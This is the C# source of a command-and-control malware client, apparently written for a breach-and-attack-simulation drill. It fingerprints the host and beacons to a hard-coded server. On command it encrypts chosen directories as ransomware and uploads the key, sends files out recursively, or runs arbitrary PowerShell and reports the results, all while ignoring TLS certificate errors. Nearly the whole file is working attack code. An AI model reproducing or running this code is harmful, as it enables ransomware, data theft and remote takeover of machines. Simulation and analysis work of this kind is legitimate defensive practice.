using System;
using System.Threading.Tasks;
using System.Threading;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Security;

// BAS Project
// Nak follow TTP in MITRE.

namespace Client
{
    class Program
    {
        //[DllImport("user32.dll", CharSet = CharSet.Auto)]
        //private static extern int SystemParametersInfo(
        //    int uAction,
        //    int uParam,
        //    string lpvParam,
        //    int fuWinIni);

        private static HttpClient httpClient = new HttpClient();
        public static string domain = "192.168.8.118"; // Replace with your endpoint
        public static string port = "443"; // Replace with your endpoint
        private static string heartbeatUrl = @"/heart"; // Replace with your endpoint
        private static string firstUrl = @"/victim"; // Replace with your endpoint
        private static string exfilurl = @"/file"; // Replace with your endpoint
        private static string commandurl = @"/command";
        private static string resulturl = @"/result";
        private static string keyurl = @"/key";
        private static string IDCommand = "";
        private static int intervalInSeconds = 5;
        private static List<string> DirectoryPaths = new List<string>();     // List of strings
        private static string uniqueId = "";
        public static string key = "";
        static Mutex mutex;
        static bool isMutexOwner = false;
        public static string MutexName = "Global\\51F98B5B-ED19-F7D5-283E-B46984E8FA69A";

        public class CommandModel
        {
            public string command { get; set; }
            public string command_uuid { get; set; }
        }

        public class KeyModel
        {
            public string victim_uuid { get; set; }
            public string ransom_key { get; set; }
            public string error { get; set; }
        }



        public static async Task Main(string[] args)
        {
            Console.WriteLine("Disclaimer: This malware is used for Netbytesec Cyberdrill exercise. We are not responsible for any misconduct or damages caused by this executable. Please be warn and take safety precaution when doing malware analysis.");
            try {

                // Mutex Check
                mutex = new Mutex(initiallyOwned: true, name: MutexName, createdNew: out isMutexOwner);
                if (!isMutexOwner)
                {
                    Console.WriteLine("Another instance of the heartbeat process is already running.");
                    return;
                }
                //Console.WriteLine("This instance owns the mutex. Starting the heartbeat...");

                string url = "";
                if (port == "443")
                    url = "https://" + domain;
                else if (port == "80")
                    url = "http://" + domain;
                else
                    url = "http://" + domain + ":" + port;

                heartbeatUrl = url + heartbeatUrl;
                firstUrl = url + firstUrl;

                var httpClientHandler = new HttpClientHandler();
                httpClientHandler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) =>
                {
                    return true;
                };
                httpClient = new HttpClient(httpClientHandler);


                var systemInfo = new Dictionary<string, string>
                {
                    { "macAddress", GetMacAddress() },
                    { "hostName", Dns.GetHostName() },
                    { "os", Environment.OSVersion.ToString() },
                    { "ipAddress", GetLocalIPAddress() },
                    { "userName", Environment.UserName },
                    { "currentDirectory", Environment.CurrentDirectory }
                };

                // Output dictionary for verification
                Console.WriteLine("Computer Information...");
                uniqueId = GenerateUniqueId(systemInfo);
                systemInfo.Add("uniqueId", uniqueId);

                foreach (var entry in systemInfo)
                {
                    Console.WriteLine($"{entry.Key}: {entry.Value}");
                }

                Console.WriteLine("==============================");
                //Console.WriteLine("Sending Information to: " + firstUrl);
                await funcPostAsync(systemInfo, firstUrl);

                Console.WriteLine("Starting Heartbeat Service...");
                heartbeatUrl = heartbeatUrl + "/" + uniqueId;
                Console.WriteLine("Current Heartbeat URL: " + heartbeatUrl);

                // Set the url endpoints for software to use
                exfilurl = heartbeatUrl + exfilurl;
                commandurl = heartbeatUrl + commandurl;
                resulturl = heartbeatUrl + resulturl;
                keyurl = heartbeatUrl + keyurl;

                await StartHeartbeatAsync();
            }
            finally
            {
                // Release and dispose of the mutex
                if (isMutexOwner && mutex != null)
                {
                    mutex.ReleaseMutex();
                    mutex.Dispose();
                    Console.WriteLine("Mutex released and disposed.");
                }
            }

        }

        public static async Task StartHeartbeatAsync()
        {
            while (true)
            {
                await SendHeartbeatAsync();
                Thread.Sleep(intervalInSeconds * 1000); // Wait for the specified interval
            }
        }

        private static async Task SendHeartbeatAsync()
        {
            try
            {
                var response = await httpClient.GetAsync(commandurl);

                // Check the response status
                if (response.IsSuccessStatusCode)
                {
                    string strResponse = await response.Content.ReadAsStringAsync();

                    // Parse through the data with customDelimiter. Can be substituted with JSON if wanted
                    Console.WriteLine($"{strResponse}");
                    Dictionary<string, string> parsedData = new Dictionary<string, string>();

                    parsedData = ParseCustomDelim(strResponse);
                    foreach (var kvp in parsedData)
                    {
                        Console.WriteLine($"{kvp.Key}: {kvp.Value}");
                    }

                    // To make sure it is not the same command, we'll check IDCommand
                    string ReceivedIDCommand = new StringBuilder().Append(parsedData["command_uuid"]).ToString();
                    string command = parsedData["command"];
                    if (IDCommand == ReceivedIDCommand)
                    {
                        Console.WriteLine("Heartbeat sent successfully. Reapted Command. Not Executed. IDCommand: " + ReceivedIDCommand);
                        return;
                    }

                    //Console.WriteLine($"Command: {parsedData["command"]}, Id: {parsedData["command_uuid"]}");
                    Console.WriteLine("Heartbeat sent successfully. Received Command: " + command);
                    if (command == "" | command == null)
                    {
                        var PostPayload = new Dictionary<string, string>
                            {
                                { "respond", "No command" }
                            };

                        await funcPostAsync(PostPayload, resulturl);
                        return;
                    }

                    //
                    int spaceIndex = command.IndexOf(' ');
                    string FuncRun;
                    string ParameterRun;
                    if (spaceIndex != -1)
                    {
                        FuncRun = command.Substring(0, spaceIndex);
                        ParameterRun = command.Substring(spaceIndex + 1);
                    }
                    else
                    {
                        FuncRun = command;
                        ParameterRun = string.Empty;
                    }

                    Console.WriteLine("Command: " + FuncRun);
                    Console.WriteLine("Parameter: " + ParameterRun);


                    // ========== Ransomware ==========
                    // Required Parameter: Directory
                    // Will encrypt files in given directories
                    // If there is an existing key in keyurl, it will use that key. If not, it will generate itself a 256bit key which is then base64 encoded
                    if (FuncRun.ToLower() == "ransom")
                    {
                        var PostPayload = new Dictionary<string, string>
                            {
                                { "respond", "Ransomware Completed" }
                            };

                        // Check to see if there is no paramter given
                        if (ParameterRun == "")
                        {
                            PostPayload = new Dictionary<string, string>
                            {
                                { "respond", "Please enter Directory" }
                            };
                            await funcPostAsync(PostPayload, resulturl);
                            return;
                        }

                        // Check if there is key already exists in database
                        Console.WriteLine("Ransomware Executed");
                        var getKeyResult = await httpClient.GetAsync(keyurl);
                        //Console.WriteLine("Checking Key at: " + keyurl);
                        string getKeyParsed = await getKeyResult.Content.ReadAsStringAsync();
                        //Console.WriteLine("Checking Result: " + getKeyParsed);

                        Dictionary<string, string> keyData = new Dictionary<string, string>();
                        keyData = ParseCustomDelim(getKeyParsed);


                        try
                        {
                            key = new StringBuilder().Append(keyData["ransom_key"]).ToString();// root.GetProperty("id").GetString();
                            //Console.WriteLine("Received Key: " + key);
                            var victimCheck = new StringBuilder().Append(keyData["victim_uuid"]).ToString();// root.GetProperty("id").GetString();
                            //Console.WriteLine("Victim Check: " + victimCheck);
                            if (victimCheck != uniqueId && victimCheck != "")
                            {
                                Console.WriteLine("Error!: This is a different PC. Weird...");
                                return;
                            }
                        }
                        catch (Exception)
                        {
                            Console.WriteLine("Creating New Key...");
                        }

                        Ransom clRansom = new Ransom();
                        key = clRansom.FuncEncrypt(ParameterRun, key);

                        // Save the key to keyurl
                        PostPayload = new Dictionary<string, string>
                        {
                            { "key", key }
                        };
                        await funcPostAsync(PostPayload, keyurl);

                        // Let server know that Ransomware was completed
                        PostPayload = new Dictionary<string, string>
                            {
                                { "respond", "Ransomware Completed" }
                            };
                        await funcPostAsync(PostPayload, resulturl);
                    }
                    // ========== /Ransomware ==========

                    // ========== Exfiltration ==========
                    // Requires the parameter directory path to exfil data.
                    // Files will be sent to exfilurl
                    else if (FuncRun.ToLower() == "exfil")
                    {
                        Exfil exfil = new Exfil();
                        Console.WriteLine("Exfiltrate Executed");
                        Console.WriteLine("Sending to: " + exfilurl);
                        await exfil.UploadFilesRecursively(ParameterRun, exfilurl);
                        var PostPayload = new Dictionary<string, string>
                            {
                                { "respond", "Exfiltration Completed" }
                            };
                        await funcPostAsync(PostPayload, resulturl);
                    }
                    // ========== /Exfiltration ==========


                    // ========== Execution ==========
                    // Required parameter: command
                    // Commands will be executed via PowerShell
                    else if (FuncRun.ToLower() == "execute")
                    {
                        Execution execution = new Execution();
                        Console.WriteLine("PowerShell Executed");
                        string data = execution.ExecutePowershell(ParameterRun);
                        var PostPayload = new Dictionary<string, string>
                        {
                            { "respond", data }
                        };
                        await funcPostAsync(PostPayload, resulturl);
                    }
                    // ========== /Execution ==========

                    else
                    {
                        return;
                    }
                    IDCommand = ReceivedIDCommand;
                }
                else
                {
                    Console.WriteLine($"Failed to send heartbeat. Status code: {response.StatusCode}");
                    string responseContent = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Failed to post system info. Status code: {response.StatusCode}");
                    Console.WriteLine($"Server response: {responseContent}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending heartbeat: {ex.Message}");
            }
        }

        private static string GetMacAddress()
        {
            var macAddress = NetworkInterface.GetAllNetworkInterfaces()
                .Where(nic => nic.OperationalStatus == OperationalStatus.Up && nic.GetPhysicalAddress().ToString() != "")
                .Select(nic => nic.GetPhysicalAddress().ToString())
                .FirstOrDefault();

            return string.Join("-", Enumerable.Range(0, macAddress.Length / 2)
                .Select(i => macAddress.Substring(i * 2, 2)));
        }

        private static string GetLocalIPAddress()
        {
            foreach (var ip in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "Not available";
        }

        private static async Task funcPostAsync(Dictionary<string, string> data, string url)
        {
            // Convert the dictionary to form data
            var content = new FormUrlEncodedContent(data);
            Console.WriteLine("Sending Data to: " + url);
            

            try
            {
                var response = await httpClient.PostAsync(url, content);
                if (response.IsSuccessStatusCode)
                {
                    Console.WriteLine("Information posted successfully.");
                }
                else
                {
                    string responseContent = await response.Content.ReadAsStringAsync();
                    Console.WriteLine($"Failed to post system info. Status code: {response.StatusCode}");
                    Console.WriteLine($"Server response: {responseContent}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error posting system info: {ex.Message}");
            }
        }

        private static string GenerateUniqueId(Dictionary<string, string> systemInfo)
        {
            // Concatenate unique attributes to form a base string
            string baseString = $"{systemInfo["macAddress"]}-{systemInfo["hostName"]}-{systemInfo["os"]}-{systemInfo["userName"]}";

            // Generate a SHA256 hash of the concatenated string
            using (MD5 md5 = MD5.Create())
            {
                byte[] bytes = md5.ComputeHash(Encoding.UTF8.GetBytes(baseString));
                StringBuilder builder = new StringBuilder();
                foreach (byte b in bytes)
                {
                    builder.Append(b.ToString("x2")); // Convert each byte to hex
                }
                return builder.ToString();
            }
        }

        private static Dictionary<string, string> ParseCustomDelim(string data)
        {
            Dictionary<string, string> parsedData = new Dictionary<string, string>();

            string[] parts = data.Split(new string[] { "||||||||||" }, StringSplitOptions.None);
            foreach (var part in parts)
            {
                if (!string.IsNullOrWhiteSpace(part) && part.Contains(":"))
                {
                    string[] keyValue = part.Split(new char[] { ':' }, 2); // Split by the first colon
                    if (keyValue.Length == 2)
                    {
                        string key = keyValue[0].Trim();
                        string value = keyValue[1].Trim();
                        parsedData[key] = value;
                    }
                }
            }
            return parsedData;
        }
    }
}
